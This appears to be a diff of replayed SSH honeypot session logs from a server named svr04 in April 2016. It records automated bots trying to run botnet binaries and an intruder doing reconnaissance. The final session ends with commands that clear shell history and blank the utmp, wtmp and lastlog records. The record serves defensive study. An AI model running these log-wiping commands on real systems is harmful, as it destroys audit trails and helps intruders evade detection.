+Processing ../log/tty/20160426-032027-f73dc42e-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-065508-fe0ac682-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-065509-fe0ac682-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-065513-fe0ac682-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-065513-fe0ac682-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-065516-5eecbabc-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-065516-5eecbabc-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-065520-5eecbabc-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-065520-5eecbabc-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-065523-97285a91-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-065523-97285a91-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-065528-97285a91-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-065528-97285a91-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-065530-5b8220d0-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-065531-5b8220d0-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-065535-5b8220d0-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-065535-5b8220d0-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-080927-0bc457fe-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-080928-0bc457fe-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-080932-0bc457fe-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-080933-0bc457fe-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-080935-88621330-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-080935-88621330-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-080939-88621330-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-080940-88621330-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-080942-d46f735f-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-080942-d46f735f-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-080947-d46f735f-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-080948-d46f735f-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-080950-addad0d6-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-080950-addad0d6-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-080955-addad0d6-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-080955-addad0d6-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-090333-5cbddca5-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160426-090341-d6454016-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hadmin@svr04:~$ __________________________________
+Processing ../log/tty/20160426-093352-64d67048-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-093353-64d67048-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-093357-64d67048-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-093358-64d67048-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-093400-3b94241f-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-093400-3b94241f-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-093405-3b94241f-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-093405-3b94241f-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-093407-7341f22e-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-093408-7341f22e-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-093412-7341f22e-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-093413-7341f22e-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-093415-c99c91bf-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-093415-c99c91bf-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-093420-c99c91bf-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-093420-c99c91bf-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-095902-6e209b0e-0e.log file...
+--2016-04-26 09:59:02
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160426-103914-60b51013-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-103914-60b51013-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-103919-60b51013-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-103919-60b51013-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-103921-32afa180-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-103922-32afa180-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-103926-32afa180-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-103926-32afa180-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-103929-ceb9adfe-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-103929-ceb9adfe-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-103934-ceb9adfe-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-103934-ceb9adfe-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-103936-6a697ab9-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-103937-6a697ab9-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-103941-6a697ab9-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-103942-6a697ab9-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-111238-644fbd7d-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-111239-644fbd7d-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-111243-644fbd7d-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-111244-644fbd7d-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-111246-51322bbf-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-111246-51322bbf-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-111250-51322bbf-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-111251-51322bbf-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-111253-6dbbd560-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-111253-6dbbd560-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-111258-6dbbd560-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-111259-6dbbd560-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-111301-a0087d34-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-111301-a0087d34-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-111306-a0087d34-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-111306-a0087d34-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-111851-89c7508b-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-111851-89c7508b-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-111856-89c7508b-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-111856-89c7508b-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-111858-39ccfa9b-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-111859-39ccfa9b-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-111903-39ccfa9b-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-111903-39ccfa9b-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-111906-02ad3956-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-111906-02ad3956-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-111911-02ad3956-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-111911-02ad3956-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-111913-118d80ad-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-111914-118d80ad-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-111919-118d80ad-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-111919-118d80ad-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-115232-6a93b01f-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-115233-6a93b01f-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-115237-6a93b01f-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-115237-6a93b01f-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-115239-2bb39c66-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-115240-2bb39c66-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-115244-2bb39c66-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-115245-2bb39c66-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-115247-f40862ca-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-115247-f40862ca-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-115252-f40862ca-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-115252-f40862ca-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-115255-a32ec926-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-115255-a32ec926-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-115300-a32ec926-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-115300-a32ec926-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-115858-662df372-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4htemp@svr04:~$ __________________________________
+Processing ../log/tty/20160426-115902-662df372-1e.log file...
+Linux
+__________________________________
+Processing ../log/tty/20160426-115902-662df372-2i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4htemp@svr04:~$ __________________________________
+Processing ../log/tty/20160426-115907-662df372-3e.log file...
+             total       used       free     shared    buffers     cached
+Mem:          7880       7690        189          0        400       5171
+-/+ buffers/cache:       2118       5761
+Swap:         3675        129       3546
+__________________________________
+Processing ../log/tty/20160426-115907-662df372-4i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4htemp@svr04:~$ __________________________________
+Processing ../log/tty/20160426-115911-662df372-5e.log file...
+ PID TTY      STAT    TIME COMMAND
+5673 pts/0    Ss      0:00 -bash
+5679 pts/0    R+      0:00 ps x
+__________________________________
+Processing ../log/tty/20160426-154903-6035e075-0e.log file...
+uid=0(root) gid=0(root) groups=0(root)
+__________________________________
+Processing ../log/tty/20160426-165303-2669e779-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-165304-2669e779-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-165308-2669e779-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-165308-2669e779-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-165311-c6a3eb71-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-165311-c6a3eb71-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-165315-c6a3eb71-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-165316-c6a3eb71-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-165318-335c2855-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-165318-335c2855-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-165323-335c2855-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-165324-335c2855-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-165326-446d2653-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-165326-446d2653-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-165331-446d2653-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-165331-446d2653-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-175003-77cb59a5-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-175004-77cb59a5-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-175008-77cb59a5-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-175009-77cb59a5-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-175011-d3daf917-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-175011-d3daf917-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-175015-d3daf917-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-175016-d3daf917-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-175018-8012d116-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-175018-8012d116-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-175023-8012d116-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-175023-8012d116-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-175026-d8183c71-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-175026-d8183c71-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-175031-d8183c71-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-175031-d8183c71-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-180537-579cee8d-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hdb1@svr04:~$ __________________________________
+Processing ../log/tty/20160426-181638-f995d5ff-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-181639-f995d5ff-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-181644-f995d5ff-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-181644-f995d5ff-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-181647-8dfb8d41-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-181648-8dfb8d41-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-181653-8dfb8d41-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-181653-8dfb8d41-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-181656-9af3db3d-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-181656-9af3db3d-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-181702-9af3db3d-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-181702-9af3db3d-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-181705-4f4d3bc9-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-181705-4f4d3bc9-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-181711-4f4d3bc9-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-181711-4f4d3bc9-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160427-005806-ec19bea1-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hadmin@svr04:~$ __________________________________
+Processing ../log/tty/20160427-062933-88c36720-0e.log file...
+--2016-04-27 06:29:33
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160427-075431-3a6e664a-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hbitnami@svr04:~$ __________________________________
+Processing ../log/tty/20160427-093825-a8e1f48f-0e.log file...
+--2016-04-27 09:38:25
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160427-110057-1ff6be46-0e.log file...
+--2016-04-27 11:00:57
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160427-110451-23a2fc66-0e.log file...
+--2016-04-27 11:04:51
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160427-120239-dd4c6803-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4h345345353@svr04:~$ __________________________________
+Processing ../log/tty/20160427-132842-b8580438-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hsyslog@svr04:~$ __________________________________
+Processing ../log/tty/20160427-133946-c3aab9f2-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hadmin@svr04:~$ __________________________________
+Processing ../log/tty/20160427-210810-491cc194-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hbuild@svr04:~$ __________________________________
+Processing ../log/tty/20160427-210814-491cc194-1e.log file...
+Linux
+__________________________________
+Processing ../log/tty/20160427-210815-491cc194-2i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hbuild@svr04:~$ __________________________________
+Processing ../log/tty/20160427-210819-491cc194-3e.log file...
+             total       used       free     shared    buffers     cached
+Mem:          7880       7690        189          0        400       5171
+-/+ buffers/cache:       2118       5761
+Swap:         3675        129       3546
+__________________________________
+Processing ../log/tty/20160427-210820-491cc194-4i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hbuild@svr04:~$ __________________________________
+Processing ../log/tty/20160427-210824-491cc194-5e.log file...
+ PID TTY      STAT    TIME COMMAND
+5673 pts/0    Ss      0:00 -bash
+5679 pts/0    R+      0:00 ps x
+__________________________________
+Processing ../log/tty/20160427-234807-269e3e47-0e.log file...
+--2016-04-27 23:48:07
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-023813-ef8eb7f2-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hadmin@svr04:~$ __________________________________
+Processing ../log/tty/20160428-034213-769a2506-0e.log file...
+--2016-04-28 03:42:13
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-035009-d2cae71f-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4h345345353@svr04:~$ __________________________________
+Processing ../log/tty/20160428-050250-a8373719-0e.log file...
+--2016-04-28 05:02:50
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-052030-4fcd834b-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hpi@svr04:~$ __________________________________
+Processing ../log/tty/20160428-054749-86270220-0e.log file...
+--2016-04-28 05:47:49
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-072202-d975ed55-0e.log file...
+--2016-04-28 07:22:02
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-081154-2f697147-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hsyslog@svr04:~$ w
+[4l 08:11:56 up 3 days,  7:01,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+syslog   pts/0    79.117.112.222    08:11    0.00s  0.00s  0.00s w
+[4hsyslog@svr04:~$ ls
+[4lrichard 
+[4hsyslog@svr04:~$ ifcof[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pps -aux
+[4lUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1   2100   688 ?        Ss   Nov06   0:07 init [2]  
+root         2  0.0  0.0      0     0 ?        S<   Nov06   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S<   Nov06   0:00 [migration/0]
+root         4  0.0  0.0      0     0 ?        S<   Nov06   0:00 [ksoftirqd/0]
+root         5  0.0  0.0      0     0 ?        S<   Nov06   0:00 [watchdog/0]
+root         6  0.0  0.0      0     0 ?        S<   Nov06   0:17 [events/0]
+root         7  0.0  0.0      0     0 ?        S<   Nov06   0:00 [khelper]
+root        39  0.0  0.0      0     0 ?        S<   Nov06   0:00 [kblockd/0]
+root        41  0.0  0.0      0     0 ?        S<   Nov06   0:00 [kacpid]
+root        42  0.0  0.0      0     0 ?        S<   Nov06   0:00 [kacpi_notify]
+root       170  0.0  0.0      0     0 ?        S<   Nov06   0:00 [kseriod]
+root       207  0.0  0.0      0     0 ?        S    Nov06   0:01 [pdflush]
+root       208  0.0  0.0      0     0 ?        S    Nov06   0:00 [pdflush]
+root       209  0.0  0.0      0     0 ?        S<   Nov06   0:00 [kswapd0]
+root       210  0.0  0.0      0     0 ?        S<   Nov06   0:00 [aio/0]
+root       748  0.0  0.0      0     0 ?        S<   Nov06   0:00 [ata/0]
+root       749  0.0  0.0      0     0 ?        S<   Nov06   0:00 [ata_aux]
+root       929  0.0  0.0      0     0 ?        S<   Nov06   0:00 [scsi_eh_0]
+root      1014  0.0  0.0      0     0 ?        D<   Nov06   0:03 [kjournald]
+root      1087  0.0  0.1   2288   772 ?        S<s  Nov06   0:00 udevd --daemon
+root      1553  0.0  0.0      0     0 ?        S<   Nov06   0:00 [kpsmoused]
+root      2054  0.0  0.2  28428  1508 ?        Sl   Nov06   0:01 /usr/sbin/rsysl
+root      2103  0.0  0.2   2628  1196 tty1     Ss   Nov06   0:00 /bin/login --  
+root      2105  0.0  0.0   1764   504 tty2     Ss+  Nov06   0:00 /sbin/getty 384
+root      2107  0.0  0.0   1764   504 tty3     Ss+  Nov06   0:00 /sbin/getty 384
+root      2109  0.0  0.0   1764   504 tty4     Ss+  Nov06   0:00 /sbin/getty 384
+root      2110  0.0  0.0   1764   504 tty5     Ss+  Nov06   0:00 /sbin/getty 384
+root      2112  0.0  0.0   1764   508 tty6     Ss+  Nov06   0:00 /sbin/getty 384
+root      2133  0.0  0.1   2180   620 ?        S<s  Nov06   0:00 dhclient3 -pf /
+root      4969  0.0  0.1   5416  1024 ?        Ss   Nov08   0:00 /usr/sbin/sshd:
+syslog      5673  0.0  0.2   2924  1540 pts/0    Ss   04:30   0:00 -bash
+syslog      5679  0.0  0.1   2432   928 pts/0    R+   04:32   0:00 ps -aux
+[4hsyslog@svr04:~$ ifconfig
+bash: ifconfig: command not found
+syslog@svr04:~$ ls
+[4lrichard 
+[4hsyslog@svr04:~$ uname -a
+[4lLinux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux
+[4hsyslog@svr04:~$ cat /etc/issue
+[4lDebian GNU/Linux 7 \n \l
+
+[4hsyslog@svr04:~$ 
+syslog@svr04:~$ unset HISTFILE;unset HISTSAVE;unset HISTLOG;unset bash_history;history -c
+[4l[4h[4l[4h[4l[4h[4l[4h[4l[4hsyslog@svr04:~$ 
+syslog@svr04:~$ 
+syslog@svr04:~$ echo > /var/run/utmp;echo > /var/log/wtmp;echo > /var/log/lastlog;unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST REMOTEHOST REMOTEUSER
+[4l[4h[4l[4h[4l[4h[4l[4hsyslog@svr04:~$ 
+syslog@svr04:~$ 
